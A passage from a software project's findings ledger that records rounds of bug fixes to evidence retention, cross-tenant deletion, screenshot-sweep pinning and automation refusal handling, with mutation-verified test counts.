  the graduation-to-trusted prerequisite both come through here"* when `listForIntegration` has no
  production caller on this branch (S2/S3). All three corrected, plus the same present-tense
  detail-page claim in `action-executor.ts`'s evidence comment. **The process lesson**: round six's
  grep was for the unwrapped sentence, and the two surviving copies were line-wrapped across a `*`
  continuation. A sweep is not complete until the wrapped form has been grepped for too - this round
  re-swept with a regex tolerant of newline + `*` between every word.

## Recently fixed - 2026-08-20 action evidence round FIVE (one blocker + two majors)

The S1 verification pass repeated a fourth time, and the same defect arrived in a fourth disguise.
These entries **retire the mechanism the round-four section below describes**, and the round-three
and round-two ones with it. The section below is kept unedited because the SEQUENCE is the finding:
four different, individually reasonable collectors, five defects, one cause.

**THE CAUSE, STATED ONCE.** Every attempt answered *"is this action gone?"* SYNCHRONOUSLY - at one
instant, from one vantage - and deleted a row on the answer. A decision scoped to an instant was
governing data whose lifetime is durable. The vantage improved every round; the defects did not stop.
The fix is not a better reachability check. It is to stop asking: TTL collects, the owner collects,
and a newer validated run supersedes. Full reasoning and the trade: `docs/decisions.md`
(2026-08-20, S1 round five).

- **`unpinned-screenshot-sweep-on-a-failed-pin-read`** (2026-08-20, **BLOCKER, FIXED**).
  `sweepScreenshotsSparingPinnedEvidence` did `pinnedRunIdsForRetention().catch(() => new Set())`
  and then **swept anyway**. A transient Mongo failure on that ONE read did not skip the sweep - it
  ran it with NO PINS. Reproduced: a healthy read gives `{removed:1, pinned:1}`; a failing read gave
  `{removed:2, pinned:0}`, deleting every screenshot behind a LIVE, unexpired evidence row, **across
  every tenant at once** (the tree is `<root>/<automationId>/<runId>` and carries no org), with no
  restore path and no erasure ledger - PNGs of authenticated client-portal sessions, court filings
  and processo numbers, gone on a blip.

  **IT WAS WRITTEN DOWN AS THE DESIGN, WHICH IS THE WORST PART.** `server.ts`'s own docblock said the
  pin read "degrades to pin nothing" and, in the same paragraph, called an unpinned sweep "the one
  failure mode that destroys data". `composition-root-screenshot-pins.test.ts`'s header repeated it,
  and the case immediately below asserted `{removed: 2, pinned: 0}` as the expected result. The
  suite was green on the defect.

  **FIXED: A FAILED PIN READ SKIPS THE SWEEP FOR THAT BOOT.** The pin set is a PRECONDITION, not an
  embellishment - without it the sweep does not know less, it knows nothing. Cost: one boot of
  retained PNGs, collected by the next healthy read. Bounded and recoverable beats unrecoverable.
  The suite case is inverted and now asserts ON DISK that the pinned run survives, with a
  next-boot-collects control so "skip" is a deferral rather than a leak.
  MEASURED: restoring `.catch(() => new Set())` reddens 2 in
  `api/tests/automation/composition-root-screenshot-pins.test.ts`.

- **`reader-side-collector-deleted-on-transient-unreachability`** (2026-08-20, **MAJOR, FIXED**).
  Round four's `discardOwnActionEvidence`, called from `action-executor.ts`'s `unknown_integration`
  and `unknown_action` refusals, treated *"this call could not resolve it now"* as *"this is gone"*.
  It is not: a Mongo blip, a credential mid-rotation, a half-applied definition write and a package
  restored a second later all produce the identical branch. Reproduced end to end: the definition
  blips away, the caller's run refuses, **every row that caller held for the key is destroyed**, the
  definition comes back, and the action runs again with its owner's only sample gone.

  The scope was impeccable - own org, own owner, both required by the type - and that is precisely
  the lesson. The executor is the best-informed vantage in the system, and its best answer is still
  an answer about one instant.
  MEASURED: restoring the collection on either refusal branch reddens 3 in
  `api/tests/integrations/action-evidence-removal.test.ts` and 1 in
  `api/tests/automation/composition-root-action-seam.test.ts`.

- **`tier-flip-collector-deleted-on-a-reverted-flip`** (2026-08-20, **MAJOR, FIXED**). Round four's
  write-time seam ran on EVERY successful `setVisibility`, deliberately without a transition table.
  `org -> private` really does end a peer's reach - for as long as the row stays `private`. It is a
  TOGGLE. Reproduced: an org-admin narrows a package to review it, every peer's sample is destroyed
  on the way down, the admin widens it back a minute later, the peers can run again and **their data
  does not come back**. The same argument applies one tier out to `publishSnapshot`, whose consumers
  the write cannot even read.
  MEASURED: restoring the collector on the `private` transition reddens 1; the cross-tenant
  round-three variant reddens 4.

  **ALL THREE FIXED BY REMOVING SYNCHRONOUS COLLECTION ENTIRELY.** Deleted:
  `api/src/integrations/evidence-reconcile.ts`; the definition store's seam
  (`DefinitionEvidenceReconciler`, `setDefinitionEvidenceReconciler`,
  `__resetDefinitionEvidenceReconcilerForTests`, and its three call sites in `create(..., 'replace')`,
  `setVisibility` and `publishSnapshot`); the executor seam `discardOwnActionEvidence` and its two
  call sites; the store methods `discardOwnerEvidence` and `listOwnerRefsInOrg`, which existed only
  to serve them; and `resolvableActionNamesForOwner`, which existed only to be asked by them. What
  remains is three DURABLE signals - `sweepExpiredEvidence` (TTL, the collector now), the owner's
  `DELETE .../evidence` and `deleteConfig`'s credential erasure, and supersede-on-validated-run. The
  residual retention window is OPEN above as `evidence-orphan-window-until-ttl`, widened and stated
  as the accepted cost rather than implied to be closed.

- **`the-null-arm-nobody-covered`** (2026-08-20, **MINOR, CLOSED BY DELETION**).
  `resolvableActionNamesForOwner`'s `if (!surface) return null` was an EQUIVALENT MUTANT:
  substituting `new Set()` there - which would have deleted every row of that owner - left the whole
  suite green (reported as 240/240 by the reviewer who found it; not re-measured here, and confirmed
  from the code instead - the arm was reachable ONLY with three non-empty terms and an incoherent
  custodian, i.e. a config row from another tenant, and no case constructed that. The earlier
  empty-term legs returned at the guard above it). It sat under the "axis 3" describe that exists
  precisely to pin "could not find out" against "resolves nothing", and under a docblock spending its
  longest paragraph on that arm. **The arm is not pinned; it is deleted with its function and both of
  its callers.** What survives is
  `resolveOwnerActionSurface`'s own `null` one tier down, which is now pinned WHERE IT ACTS - at the
  executor, where it becomes a `credential_invalid` refusal handed to the caller rather than a
  silent deletion. MEASURED: `?? reader` in place of that arm reddens 2 in
  `api/tests/integrations/action-resolution.test.ts`.

## Recently fixed - 2026-08-20 action evidence round four (one blocker + one major + five minors)

The S1 verification pass repeated a third time. Round two was too NARROW and orphaned a consumer's
evidence; round three widened it and DELETED ACROSS A TENANT BOUNDARY. Three rounds is evidence that
the shape was wrong, not the parameter, so these entries retire the mechanism the section below
describes rather than tuning it.

- **`write-time-reconciler-deleted-across-a-tenant-boundary`** (2026-08-20, **BLOCKER, FIXED**).
  Round three's `discardEvidenceOfUnresolvableActions` reconciled EVERY tenant's rows from a
  definition write in ONE tenant, asking `getForActor(runner)` per row owner. It was wrong on two
  independent axes, each reproduced end to end before anything changed:

  **(a) LIVE ROW vs FROZEN SNAPSHOT.** A row of another org is resolved through its
  `publishedSnapshot` (`crossOrgView` -> `publishedViewOf`), never through its live fields - that is
  what publishing is for, and the replace branch carries the snapshot forward deliberately while
  `setVisibility` re-promotes without re-scrubbing. The reconciler asked for the live row. So: org A
  publishes `[consultar_processo, arquivar_processo]`; org B connects its own credential and runs
  `consultar_processo` against its own clients' data; org A un-publishes, drops the action, and
  re-promotes. Org B's run of `consultar_processo` STILL SUCCEEDS - measured, through the real
  executor - while org A's write deleted org B's only copy of the sample and its screenshot pin.
  **(b) RUNNER vs CUSTODIAN.** An org-shared credential resolves the definition as the CUSTODIAN and
  "never as the reader" (`definitionActorForCredential`, whose docblock spends a paragraph on the
  exfiltration hole that rule closed). The evidence key is stamped with the RUNNER. The reconciler
  asked as the runner, who cannot see the custodian's private row, got the empty set, and every
  peer's evidence was wiped by a re-save that DROPPED NOTHING.

  **FIXED BY CHANGING THE SHAPE, and the standing rule is now one sentence: a write by one org never
  deletes another org's data.** The cross-tenant listing (`listOwnerRefsForKey`) is DELETED rather
  than narrowed - a cross-tenant listing is what made a cross-tenant delete expressible. In its
  place: (1) the READER collects its own, in `action-executor.ts`, which resolves through the one
  production path and therefore knows the answer for its own org, owner, credential and document;
  (2) the WRITE collects inside its own tenant only, through a seam taking `(orgId, integrationKey)`
  implemented by `evidence-reconcile.ts`; (3) everything else fails towards RETAINING, bounded by
  `sweepExpiredEvidence`, the owner's erasure control and the credential disconnection. The
  resolution itself moved to `action-resolution.ts` and is SHARED WITH THE RUN PATH, so a retention
  decision cannot believe something a run does not.
  Suite: `api/tests/integrations/action-evidence-removal.test.ts` (33 cases, entered at
  `saveAuthoredDefinition`, `create(..., 'replace')`, `setVisibility`, `publishDefinition`,
  `executeUserIntegrationAction` and `deleteConfig`).

- **`three-global-tier-cases-were-unfailable-through-the-wrong-fixture-writer`** (2026-08-20,
  **MAJOR, FIXED**). This is HOW the blocker above hid. The removal suite built its `global` rows
  with `definitions.create({ visibility: 'global' })` instead of the production writer
  (`requestPublish` -> `publishDefinition`), so the row had NO `publishedSnapshot` and
  `publishedViewOf` silently fell back to the live content. Every cross-org case therefore described
  a world in which live and published can never disagree - which is the ONLY thing that mattered.
  With the real writer the same fixture describes a deletion that destroys still-runnable evidence.
  The suite now publishes through the real flow and proves reachability by RUNNING THE ACTION after
  the write rather than by asking a resolver.

- **`delete-config-org-shared-arm-erased-peers-it-never-served`** (2026-08-20, **MAJOR, FIXED**).
  `deleteConfig`'s `'every-owner-in-org'` arm deleted the evidence of every member of the org.
  `findConfigForOwner` answers `rows.find(c => c.ownerUserId === owner)` BEFORE falling back to the
  custodian-less shared row, so a member holding their own credential was never served by the deleted
  row: their sample is a sample of a credential they still have, and one member's disconnect
  destroyed another member's data - the same disease as the cross-org one, one tenant in. The scope
  is now `{ everyOwnerExcept: [...] }`, computed from the configs still present after the delete, i.e.
  every owner for whom `findConfigForOwner` WOULD have resolved this row.

- **`publish-snapshot-was-dismissed-as-widening-only`** (2026-08-20, MINOR, FIXED). The enumeration
  reasoned about the DEFINITION rather than about what the consumer RESOLVES: a `global -> global`
  re-publish writes a fresh snapshot, and a snapshot with fewer actions narrows every consumer at
  once. It is now named as a narrowing write in every place the enumeration appears; it still does
  not collect consumer rows, because no write does.

- **`the-evidence-key-claim-survived-in-stores-ts`** (2026-08-20, MINOR, FIXED). `api/src/data/stores.ts`
  still documented the key as `(orgId, integrationKey, actionName)` - the SIXTH copy of a claim the
  previous round's commit says it corrected in five places, and the one a future author reads first
  because it sits on the collection handle itself. Corrected, with the owner term's reason stated
  there rather than referenced.

- **`resolvable-action-names-role-was-an-equivalent-mutant`** (2026-08-20, MINOR, FIXED).
  `resolvableActionNames` passed `role: 'user'` under a docblock that spent a paragraph justifying it
  as "the least-privileged reading" - and the whole suite stayed green (76/76) with `super-admin`
  substituted, because `isDefinitionVisibleTo`'s role branches only ever fire for a sentinel-org row
  or a review window. The prose asserted a safety property the tests could not see. The method is
  deleted with the collector it served; the replacement resolves through the production path, where
  the principal is not a parameter anyone chooses.

- **`the-reconcile-was-an-uncapped-scan-inside-every-save`** (2026-08-20, MINOR, FIXED). The
  round-three reconcile did a cross-collection listing plus ONE sequential database read PER OWNER,
  awaited inside every ordinary definition save. For a popular global integration that is N
  sequential round-trips on every save, uncapped and untimed, and the cliff appears first in the
  tenants with the most data. Now: the listing is org-scoped (so N is owners in ONE org), and
  `MAX_RECONCILED_OWNERS` (25) stops the fan-out rather than paying it - the remainder is left to the
  reader path and the retention sweep, which is exactly what "fail towards retaining" is for.

- **`action-evidence-had-no-owner-erasure-control`** (2026-08-20, MINOR, FIXED). Round three wired
  `deleteConfig`, which is real, so the claim that `discardEvidence` had "zero production callers"
  was already stale when it was made - the CODE had one, through the reconciler's default dep and
  through the disconnect path. What was genuinely missing is the control a person actually asks for:
  every removal was a consequence of something ELSE (a later run supersedes, the action stops
  resolving, the credential is disconnected, the window closes), so somebody who simply did not want
  a sample of their third-party account kept had to disconnect the whole integration to be rid of it.
  `DELETE /api/v1/integrations/:key/actions/:actionName/evidence` (`auth: 'user'`, idempotent,
  addressed by the deterministic id over the VERIFIED actor) is that control.

## Recently fixed - 2026-08-20 action evidence round three (one major + four minors)

The S1 verification pass repeated. Its finding is that the round-two fix below was RIGHT ABOUT THE
METHOD AND WRONG ABOUT THE UNIT, so the entries here correct the ones in the next section rather than
sitting beside them.

- **`evidence-collector-scoped-to-the-writing-org`** (2026-08-20, **MAJOR, FIXED**). Round two's
  collector ran `discardEvidenceOfRemovedActions({ orgId: input.orgId, ... })` - the org that WROTE
  the definition - while every evidence row is keyed by the org that RAN the action. The `global`
  tier exists precisely so those differ.

  REPRODUCED END TO END, as a failing spec before any code changed: a super-admin publishes org A's
  definition at `visibility: 'global'`; `getForActor` grants the cross-org tier, so a user in org B
  resolves it, connects THEIR OWN credential and runs a browser-steps action. The row lands under
  `{orgId: orgB, ownerUserId: uB}` holding org B's real response body (client PII) plus an automation
  pin naming `run-consumer`. Org A then re-authors the definition without that action, and the
  `deleteMany` filtered on org A matched NOTHING. Measured after the replace: 2 rows left, both org
  B's, PII intact, `pinnedRunIdsForRetention()` still returning `run-consumer`. The action now
  resolves for NOBODY, so the row can never be superseded either - the screenshots of an
  authenticated client-portal session were exempt from the 7-day sweep PERMANENTLY, which is exactly
  the state the round-two blocker was raised to end.

  A SECOND REACHABLE TRIGGER used the transition round two's header dismissed BY NAME as not a
  removal path: `setVisibility` `global -> org` takes every action of the integration away from every
  consumer org at once, and `org -> private` does the same to every peer inside the author's own org,
  with no super-admin anywhere in the story. Their rows and pins stood with nothing that could
  release them.

  THIS IS THE FIFTH TIME A DECISION IN THIS CODEBASE HAS BEEN SCOPED TO THE WRONG UNIT (per-run where
  it should be per-origin, per-recipe where it should be per-call, per-action where it should be
  per-call, per-artifact where it should be per-owner, and here per-writing-org where it should be
  per-running-org), and that - not the individual defect - is the finding.

  FIXED by replacing the diff with a RECONCILIATION scoped by the ROW: for each `(orgId,
  ownerUserId)` holding a row for the integration, `discardEvidenceOfUnresolvableActions` asks
  `getForActor` - the same resolver production runs actions through - which action names that owner
  still resolves, and drops the rest. `definition-store.ts` calls it from both writes that can narrow
  reach (the replace branch and `setVisibility`), so a rule with no transition table in it covers
  both triggers and any future tier. `actionsDroppedBy` is deleted; nothing diffs action sets for
  evidence any more. The listing (`listOwnerRefsForKey`) is cross-tenant and projected to org + owner
  + action name, so no sample crosses the boundary and its caller only ever learns a count; and the
  collector fails towards KEEPING everywhere - a listing that throws collects nothing, a resolution
  that throws keeps that owner's rows - because deletion is irreversible and the row is somebody's
  only copy.

  THE CLAIMS WERE FIXED AS WELL AS THE CODE. "There is exactly ONE path" and "an action belongs to
  the DEFINITION, so when it is dropped it is dropped for every member of the org at once" appeared
  in the store header, `recipe-lifecycle.ts`, `architecture.md`, `decisions.md` and this ledger; all
  five now say that a row lives only while its OWNER can still resolve its action.

  SUITE: `api/tests/integrations/action-evidence-removal.test.ts` (21 cases), entered at the REAL
  `saveAuthoredDefinition`, `create(..., 'replace')`, `setVisibility` and `deleteConfig`.
  MUTATION-VERIFIED, every count measured with the source restored and md5-checked afterwards:
  restoring the per-writing-org scope reddens 2 (both cross-org cases, while every same-org case
  stays green - exactly the shape of the shipped bug); deleting the `setVisibility` call reddens 2;
  dropping the resolution check so the collector deletes blindly by (key, action) reddens 8,
  including the control that another tenant resolving the same action name through its OWN definition
  keeps its row; resolving with `userId: ''` instead of the row's owner reddens 1 (the `org ->
  private` peer case, which is what proves the per-OWNER unit inside one org); inverting the
  fail-posture so a failed resolution deletes reddens 1; dropping the listing's `integrationKey` term
  reddens 1, in `listOwnerRefsForKey`'s own case.

- **`action-evidence-erasure-control-still-had-no-caller`** (2026-08-20, **MINOR, FIXED**).
  `discardEvidence` still had zero production callers after round two, and the round-two header said
  the erasure gap "is recorded as a gap in docs/findings.md" when the only erasure entry here was
  about the screenshot TREE, not this collection. A user who connected an integration, ran a
  browser-steps action once and then hit `DELETE /api/v1/integrations/:key` kept a durable row of
  their third-party account's request/response plus a permanent screenshot pin, with no way to remove
  it and no way to supersede it (that needs re-connecting and re-running).

  FIXED by wiring the control rather than by recording the gap: `deleteConfig` calls
  `discardEvidenceOfDisconnectedConfig` after each config row goes. It is deliberately NOT the
  reconciler - the definition still resolves, so a reconcile keeps every row; what ended is the
  connection to the account whose traffic the sample holds. The scope is a discriminated `owner`,
  never an optional term: a config stamped with a custodian erases that person's rows, and a legacy
  org-shared config (no custodian - the credential `findConfigForOwner` hands to every member)
  erases every member's. `discardEvidence` itself now has a caller too: it is the reconciler's
  removal primitive. MUTATION-VERIFIED: deleting the call reddens 2; always taking the org-wide arm
  reddens 1 (the colleague's row).

- **`pinned-run-read-was-unbounded-and-its-failure-uncatchable`** (2026-08-20, **MINOR, FIXED**).
  `pinnedRunIdsForRetention()` did `find({})` with no filter and no projection, then walked whole
  rows for `runId`. Rows are hundreds of KB and grow as orgs x owners x integrations x actions with
  no TTL; at 10k rows that is a multi-gigabyte materialisation AT BOOT to build a set of short
  strings. The caller's `.catch` degrades a rejection but cannot catch an OOM abort, so the real
  failure mode was a boot crash loop rather than the documented "degrades to pin nothing". The
  round-two docblock argued the PIN COUNT is bounded, which is true and a different claim from the
  READ being bounded.

  FIXED with an additive `projection` option on `Store.find` (Rule 7 shape: a third optional
  argument, so every existing caller keeps its meaning) plus an `{'evidence.kind': 'automation'}`
  query term. The docblock now records WHICH of the two `kind` tests is load-bearing instead of
  calling them a masked pair: the query term narrows (measured), while the loop's `ev.kind ===
  'automation'` is a TYPE discrimination - deleting it does not compile, and casting it away instead
  SURVIVES, because an api-call row carries no `runId` to read. MUTATION-VERIFIED: dropping the
  projection reddens 1 (a planted sample comes back in the returned documents); dropping the query
  term reddens 1 (two documents instead of one); the cast variant survives, and is recorded as
  surviving rather than claimed as covered.

- **`evidence-fixture-used-a-non-member-run-status`** (2026-08-20, **MINOR, FIXED**). The removal
  suite built automation evidence with `status: 'succeeded'`, which is not a member of `RunStatus`
  (the production writer `collectRunEvidence` copies `RunRecord.status` straight through, and the
  members are `running | completed | failed | ...`). It is typed `string?`, so nothing caught it, and
  nothing asserted it - so it was not unfailable, it was a stand-in waiting to be copied into a case
  that DOES assert a run status. Same fixture-honesty class as the one fixed one file over in round
  two. FIXED to `completed`, with the production writer named in the fixture's own comment.

- **`the-awaited-boot-sweep-was-unpinned`** (2026-08-20, **MINOR, FIXED**).
  `composition-root-screenshot-pins.test.ts` could not distinguish `await sweep(...)` from
  `void sweep(...)`: mutating the await left 5/5 green, because `bootState` awaits slower things
  afterwards so the sweep won the race either way. The round-two report, the `server.ts` docblock and
  the decisions entry all presented the await as what makes the sweep observable; what actually makes
  it observable is the REQUIRED `pinnedRunIds` option plus that suite. The await was correct and
  unpinned, and the pass was a race that happened to win.

  FIXED by making the distinction structural, the same move `pinnedRunIds` already used: `bootState`
  now READS the returned counts (the retention log line moved from the composition function to the
  call site), so `void` has no `.removed` and the mutant stops compiling. MUTATION-VERIFIED: `await
  -> void` fails `tsc` with five errors. The three places that made the wrong claim are corrected,
  and the suite header now states what it does NOT pin.

## Recently fixed - 2026-08-20 action evidence round two (blocker + three majors + three minors)

The S1 verification pass. All seven are closed by landed fixes with mutation-verified tests; the
counts below are MEASURED (each mutation applied to the source, the named suites re-run, the source
restored and checksummed) rather than asserted.

- **`action-evidence-had-no-removal-path`** (2026-08-20, **BLOCKER, FIXED**). `ActionEvidenceStore.discardEvidence`
  had **zero production callers**, and its docblock named two it did not have: *"Reached when the
  action itself is gone (a definition write that dropped it), and by the erasure path"*. Both false -
  the fifth instance of the dead-binding class in this repo, and the second in this very slice.

  REPRODUCED END TO END: a definition with actions `[doomed, survivor]`; evidence recorded for
  `doomed` whose excerpt carries client PII (`Processo 1234/24.5T8LSB - Cliente: Maria Silva`); then
  the ordinary builder save (`create(..., onConflict: 'replace')` with `[survivor]` only) - the SAME
  call site that already discards the sibling collection's evidence via
  `discardEvidenceOfRemovedRecipes(recipesDroppedBy(...))`. Result: the action gone, `getEvidence`
  still returning the row, the PII still in it, and `pinnedRunIdsForRetention()` still naming the
  run - so its screenshots of an authenticated client-portal session were exempt from the 7-day
  sweep PERMANENTLY, because the pin releases only on supersede or discard and neither could ever
  happen again. S1 converted a bounded retention into an unbounded one through the most ordinary
  edit there is.

  FIXED by enumerating the removal paths FROM THE CODE the way `recipe-lifecycle.ts` does, in
  `action-evidence-store.ts`'s own header. Grepping the writers of the definition document finds
  `IntegrationDefinitionStore.create` and `IntegrationRecipeStore`, and the recipe store only `map`s
  the existing `actions` array, so it can never drop an action: there is exactly ONE path, and no
  definition-delete path exists at all. `discardEvidenceOfRemovedActions` is called on that branch
  beside the recipe collector, and it crosses OWNERS (an action belongs to the definition, so it is
  dropped for everyone at once) while staying org-scoped. `actionsDroppedBy` is a SEPARATE predicate
  from `recipesDroppedBy` on purpose - the latter filters to actions carrying a compiled recipe,
  which would have skipped the commonest evidence-bearing action there is, a plain `api-call`.

  SUITE: `api/tests/integrations/action-evidence-removal.test.ts`, entered at the REAL
  `saveAuthoredDefinition` and the REAL `create(..., 'replace')`, never at the collector, and
  counting DOCUMENTS. MUTATION-VERIFIED: deleting the collector call reddens 6; making
  `actionsDroppedBy` filter on `recipe !== undefined` (the plausible copy-paste) reddens 6; dropping
  the `orgId` term from `discardEvidenceForAction` reddens 4.

- **`action-evidence-keyed-per-org-while-credentials-are-per-owner`** (2026-08-20, **MAJOR, FIXED**).
  `actionEvidenceIdFor` hashed `(orgId, integrationKey, actionName)` with no owner, while
  `findConfigForOwner` resolves a credential per `(orgId, ownerUserId)` and `action-consent.ts`'s
  `idFor` keys an approval on `(orgId, scope.userId, ...)`.

  REPRODUCED: one `org`-visible definition, two users in orgA each with their own `api_key` config.
  The owner runs the action and the row holds the OWNER's private data; the peer runs the same
  action under the PEER's credential and the single row now holds the peer's data and no longer the
  owner's. Two live consequences: the peer silently destroys the owner's sample, AND
  `trustAuthoredAction` reads this collection - so user A could promote an action to `trusted`, and
  thereby make it auto-runnable by `achieve`, on the strength of a run user B made against B's OWN
  third-party account.

  The module's docblock argued only that a sample must not cross ORGS and never considered that
  WITHIN an org the sample is the owner's. Its claim that "a pointer inherits the rule that already
  exists" holds for the PNG behind the screenshot plane's org+owner check and NOT for the excerpt
  copied into the org-keyed row beside it.

  FIXED by keying the evidence the way the credential and the consent are keyed:
  `(orgId, ownerUserId, integrationKey, actionName)`, both terms in the `_id`, both stored, both
  query terms, both re-checked on every fetched document. `trustAuthoredAction` now reads the
  PROMOTING actor's own row. MUTATION-VERIFIED: dropping `ownerUserId` from the `_id` reddens 12
  across three suites; dropping `getEvidence`'s owner re-check reddens 2 (and its org re-check 1);
  making `trustAuthoredAction` read the definition AUTHOR's evidence instead of the actor's reddens
  2 in the achieve suite. The two `listForIntegration` owner terms are EQUIVALENT MUTANTS - each
  alone survives, both together redden 4 - which the store docblock records.

- **`screenshot-pin-binding-was-a-surviving-mutant`** (2026-08-20, **MAJOR, FIXED**). Dropping
  `pinnedRunIds` from the `sweepExpiredScreenshots` call in `bootState` left 46/46 green: both
  halves were pinned in isolation and nothing joined them, because `bootState` was invoked by no
  test at all. Had that mutant shipped, every automation-backed evidence row would silently point at
  swept directories after 7 days.

  FIXED twice over, because neither alone is enough. STRUCTURALLY: `sweepExpiredScreenshots`'s
  `pinnedRunIds` is now a REQUIRED option, so dropping or renaming it stops compiling. BY TEST:
  `api/tests/automation/composition-root-screenshot-pins.test.ts` enters at the REAL `bootState`
  against the real collection and a real screenshot tree, with both run dirs sharing one long-ago
  mtime so only the pin can produce the result, and with an empty-evidence control proving the sweep
  is alive. The composition was named and exported as `sweepScreenshotsSparingPinnedEvidence` and
  `bootState` now AWAITS it (it was fire-and-forget, which is why no caller could wait on it).
  MUTATION-VERIFIED: passing `new Set()` instead of the real pins reddens 3; removing the pin read's
  `.catch` degrade reddens 1.

- **`automation-action-evidence-shipped-with-no-suite`** (2026-08-20, **MAJOR, FIXED**).
  `api/src/automation/action-evidence.ts` - 123 lines - had no test file and no ledger row. Three
  surviving mutants were measured, including one making `excerptOf` return
  `JSON.stringify(step.error.details)`: precisely the exclusion the module's own docblock names
  ("NOTE WHAT IS NOT READ: `StepRecord.error.details` (an arbitrary debug payload with no redaction
  contract)"), and the one field no redaction leg governs. A stated safety decision with no test is
  one the next edit undoes silently.

  FIXED by `api/tests/automation/action-evidence.test.ts` (24 cases), which asserts the exclusions
  BY CONSEQUENCE - a marker planted only in `error.details` / `logTail` / `visionReasoning` must not
  appear anywhere in the collected evidence, with a control proving the excerpt that IS read still
  arrives. MUTATION-VERIFIED: reading `error.details` reddens 2, reading `logTail` reddens 1,
  slicing the LAST steps instead of the first reddens 1.

- **`run-step-evidence-title-held-the-step-status`** (2026-08-20, MINOR, FIXED).
  `RunStepEvidence.title` was populated with `StepRecord.status`, and `StepRecord` has no title, so
  every step on the S2 detail page would have been titled with its status. Nothing asserted `title`
  at all. The field is now named `status`, which is what it holds. MUTATION-VERIFIED: renaming it
  back reddens 3 across the collector suite and the composition-root seam suite.

- **`api-call-request-body-was-truncated-silently`** (2026-08-20, MINOR, FIXED). `capEvidence`
  called `capText` on the api-call REQUEST body and discarded the `truncated` half, and
  `ApiCallEvidence.request` had no `truncated` field - contradicting the module's stated property
  that truncation is recorded and never silent. Worse in the specific: the executor's
  `truncateForDisplay` appends a "… [truncated, N more bytes]" marker at the END, which this cap
  then sliced off, so the stored sample looked like a complete body that simply stopped. FIXED, with
  a fits-comfortably control. MUTATION-VERIFIED: dropping the flag again reddens 1.

- **`isolation-suite-empty-org-case-had-three-unfailable-legs`** (2026-08-20, MINOR, FIXED). The
  empty-org case ran five assertions of which only one could fail: with no row stored under the
  empty org, the point read, the list read and the discard all answered empty whether or not
  `isTenantScoped` existed, while the header claimed the guard was proved. The case now PLANTS rows
  under the empty org and the empty owner before asking, and is split so each leg fails on its own
  filter. MUTATION-VERIFIED: dropping the guard from `getEvidence` reddens 1 and from
  `listForIntegration` reddens 1 - and `discardEvidence`'s own guard is HONESTLY RECORDED AS MASKED
  (it calls `getEvidence`, whose guard fires first, so it survives alone and only the pair reddens
  the discard leg, 2 cases). The suite header and the store docblock both say so rather than
  implying otherwise.

## Recently fixed - 2026-08-19 neutrality stops being the fall-through (round seven)

Rounds three to six each closed one refusal that was NEUTRAL against the failure ceiling for a
condition no waiting could change. Round seven stops treating them as three incidents and closes the
CLASS: neutrality is now a declared property of a named clearing act, refusals can only be built in
one module, and the census that keeps them honest covers every construction site rather than one
exported function. Each behaviour change is pinned by a test verified to fail against the unfixed
source.

- `posture-drift-refusal-is-neutral-but-repeats-identically` (**MAJOR**, the third sighting, found
  and fixed this round). Fixture: `[integration(posture permissive, baseUrl https://portal.example.com),
  wait, wait]`, no daemon. Permissive means locality answers `in-process` and the hosted Chromium
  opens; the act in step 1 leaves the declared origin (a click, an OAuth hop, a 302), so the
  post-action observation reports `https://bank.example.pt/...`. `resolveLocalityForStep` then built
  `{ kind: 'blocked', clearedBy: 'start-a-machine' }` -> `awaiting_daemon` -> NEUTRAL. Two
  consecutive `runAutomation` calls on an identical fixture both returned `awaiting_daemon`: the
  cause is a property of the STEP LIST, so replaying reproduces the same halt at the same index, the
  schedule re-fires nightly forever, the ceiling counts nothing, and the remediation it printed named
  a machine. **`clearedBy: 'start-a-machine'` was also a false instruction**, though the code
  corrects the report that no laptop can clear it at all: a connected daemon WOULD sidestep the check
  by making the verdict `bridge` before it runs. That is an accident of the route rather than the
  remediation, and it is unavailable to the owner with no machine, which is every owner running
  hosted.
  **HOW IT ESCAPED THE CENSUS.** `tests/automation/locality.test.ts` walks the cross product of
  `resolveLocality`'s whole input space and asserts the exact set of refusals it emits. This refusal
  was built in `engine.ts`, so the census could not see it. A census of one function is not a census
  of the product.

- `route-switch-refusal-is-neutral-but-repeats-identically` (was OPEN, LOW; **FIXED**). Same class,
  recorded last round and deferred on the grounds that an honest terminal state "means a third
  `clearedBy` value with its own ceiling rule and its own badge copy - a contract decision that
  deserves its own slice". **The code won that argument**: `localityTerminalFailureRecord` already
  existed, is already terminal on the schedule rail, and needs no new run status, no new badge copy
  and no new ceiling rule. The deferral was costing more than the fix.

**THE CLASS FIX**, in four parts that had to move together:

  (a) `clearedBy` gains `edit-the-automation`, for a cause that is a property of the step list. The
  engine maps it to the plain non-recoverable failure - terminal, drives the ceiling, auto-pauses
  loudly - and never to a ceremony ask, because re-establishing a session does not stop an
  automation navigating off its declared origin.

  (b) NEUTRALITY IS DECLARED, NOT DEFAULTED. `refusalRecordFor` asked `clearedBy === 'pair-a-machine'`
  and carried everything else as the neutral halt, so a refusal that failed to be the one terminal
  case inherited "retry forever" by saying nothing - which is how all three defects arrived.
  `CLEARING_ACTS` is now a `Record<ClearingAct, { neutral, because }>`: a new act does not compile
  until its neutrality is written beside the reason it is true, `refusalIsNeutral` is a table read,
  and the default for anything unconsidered is TERMINAL.

  (c) EVERY REFUSAL IS BUILT IN `locality.ts`. The blocked member carries a module-private `unique
  symbol` brand, so no other module can construct one - verified by the two test literals that
  stopped compiling. The drift and route-switch decisions moved in with it as
  `narrowLocalityForRun`, a pure function over the run's live facts (the URL the hosted browser is
  on, the origin the step declared, the route its context is already open for); `engine.ts` gathers,
  `locality.ts` judges.

  (d) THE CENSUS COVERS BOTH ENTRY POINTS. It crosses every verdict from `resolveLocality` with
  every state `narrowLocalityForRun` can be handed, asserts the exact set of refusals emitted, that
  each answers one way, that the terminal set is exactly the three whose cause is not environmental,
  and that every act in `CLEARING_ACTS` is reachable and every act reached is in `CLEARING_ACTS`.

  MUTATIONS, all verified red: see the round-seven mutation table in the commit message.

- `a-scheduled-automation-waiting-for-an-APPROVAL-reported-Failed` (MEDIUM, user-visible, FIXED).
  `BLOCKED_RUN_STATUSES` (`automation/service.ts`) held `awaiting_daemon` and `needs_credentials`
  but not `awaiting_consent`, so a scheduled AUTOMATION halting for an integration write approval
  came back `outcome: 'failed'` and the owner's badge read "Failed" for a run sitting waiting on
  their approval. The OTHER schedule target kind already answered `blocked` for the identical halt
  (`mapIntegrationOutcome`), the schedules surface already carried `runBlocked.awaiting_consent`
  copy for it, and `supervisor.ts`'s own docblock already named `awaiting_consent` beside
  `needs_credentials` as a block on a human act - so the two rails disagreed about one halt.
